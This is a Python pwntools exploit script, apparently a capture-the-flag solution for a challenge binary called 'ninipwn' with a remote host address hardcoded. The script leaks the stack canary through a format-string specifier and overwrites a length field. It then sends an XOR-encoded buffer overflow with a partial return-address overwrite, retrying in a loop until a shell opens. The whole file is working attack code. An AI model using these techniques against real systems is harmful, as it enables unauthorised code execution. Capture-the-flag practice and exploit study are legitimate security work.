#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *
from pwnlib.util.sh_string import test_all

elf = context.binary = ELF("./ninipwn", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 3.75.185.198 7000"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}

# for i in range(1, 128):
#     with context.quiet:
#         io = start()
#     io.sendlineafter(b"Text length: ", str(0x100).encode())
#     io.sendlineafter(b"Key: ", f"%{i}$p".encode())
#     leak = io.recvline()
#     print(f"{i}: {leak}")
#     # io.sendlineafter(b"Text: ", )
#     with context.quiet:
#         io.close()


while True:
    with context.quiet:
        io = start()
    canary_idx = 39
    io.sendlineafter(b"Text length: ", str(0x100).encode())
    key = f"%{canary_idx}$p".encode().ljust(8, b"\x00")
    text_length = p16(0x11a)
    io.sendafter(b"Key: ", key + text_length)
    leak = io.recvline().strip().decode().split("0x")
    canary = int(leak[1], 16)
    log.info(f"{canary=:#x}")
    payload = b"A" * (0x110 - 8)
    payload += p64(canary) + p64(0) + p16(0x8433)
    payload = xor(payload, key)
    io.sendafter(b"Text", payload)
    io.sendline(b"id")
    try:
        io.recvline()
    except EOFError:
        with context.quiet:
            io.close()
        continue
    io.interactive()
    quit()
